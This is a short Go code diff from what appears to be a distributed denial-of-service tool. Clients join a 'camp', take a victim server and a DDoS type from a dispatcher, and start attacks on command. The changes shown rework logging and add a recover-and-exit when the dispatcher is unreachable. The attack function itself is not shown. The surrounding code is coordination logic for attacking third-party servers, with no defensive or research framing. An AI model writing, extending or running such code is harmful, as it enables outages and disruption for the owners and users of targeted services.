@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"github.com/fatih/color"
 	"net/http"
+	"os"
 	"strings"
 	"sync"
 	"time"
@@ -142,7 +143,7 @@ func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) 
 				logChan <- "change attack mode " + cmp.Settings.DDOSType
 			}
 			if cmp.Settings.Status == "attacking" {
-				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan)
+				go StartAttack(cmp.Settings.VictimServer, cmp.Settings.DDOSType, stopchan, logChan)
 			}
 			if cmp.Settings.VictimServer != prevCmp.Settings.VictimServer {
 				logChan <- "Victim server changed to " + cmp.Settings.VictimServer
@@ -161,7 +162,7 @@ func (c *Client) ListenAndDo(ChangedDataChan chan CampAPI, logChan chan string) 
 	}
 }
 
-func (c *Client) Start(logChan chan string) {
+func (c *Client) Start() {
 	err := c.JoinCamp()
 	if err != nil {
 		//check if error contain connection refused
@@ -175,6 +176,8 @@ func (c *Client) Start(logChan chan string) {
 		}
 	}
 	var ChangedDataChan = make(chan CampAPI, 1)
+	logChan := make(chan string, 1)
+
 	wg := sync.WaitGroup{}
 	wg.Add(1)
 	go func() {
@@ -205,6 +208,17 @@ func (l *Leader) ListenChangeView(changedDataChan chan CampAPI) {
 	}
 }
 func (l *Leader) Start() {
+
+	func() {
+		defer func() {
+			if r := recover(); r != nil {
+				color.Red("Dispatcher server is not running")
+				os.Exit(0)
+			}
+		}()
+		l.GetCamp()
+	}()
+
 	var changedDataChan = make(chan CampAPI, 1)
 	logChan := make(chan string, 10)
 	wg := sync.WaitGroup{}
